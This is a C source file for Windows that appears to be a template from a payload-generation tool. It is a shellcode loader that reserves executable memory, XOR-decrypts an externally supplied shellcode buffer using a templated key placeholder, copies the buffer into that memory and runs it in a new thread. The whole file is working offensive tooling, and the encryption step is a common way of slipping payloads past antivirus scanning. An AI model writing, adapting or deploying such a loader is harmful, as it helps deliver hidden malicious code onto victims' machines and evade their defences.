#include "Shellcode.h"
/*
Externally defined shellcode variables:

{
    unsigned char shellcode[];
    unsigned int shellcode_size;
}

*/

#include "Xor.h"
/*
Externally defined xorShellcode function:

{
    void xorShellcode(unsigned char *shellcode, unsigned int shellcode_size, unsigned char key);
}

*/

#include <windows.h>
int main( int argc, char * argv[] ) {

    /* Allocate memory for shellcode */
    LPVOID mem = VirtualAlloc( NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE );
    if ( mem == NULL ) {
        return 1;
    }

    /* Decrypt shellcode */
    xorShellcode( shellcode, shellcode_size, "${KEY}" );

    /* Copy shellcode into allocated memory */
    memcpy( mem, shellcode, shellcode_size );

    /* Create thread to execute shellcode */
    HANDLE hThread = CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL );

    if ( hThread == NULL ) {
        /* Free allocated memory if cannot create thread for whatever */
        VirtualFree( mem, 0, MEM_RELEASE );
        return 1;
    }

    WaitForSingleObject( hThread, INFINITE );

    /* Peacefully exit now that the thread has finished, and clean up dangling handles. */
    CloseHandle( hThread );
    VirtualFree( mem, 0, MEM_RELEASE );

    return 0;
}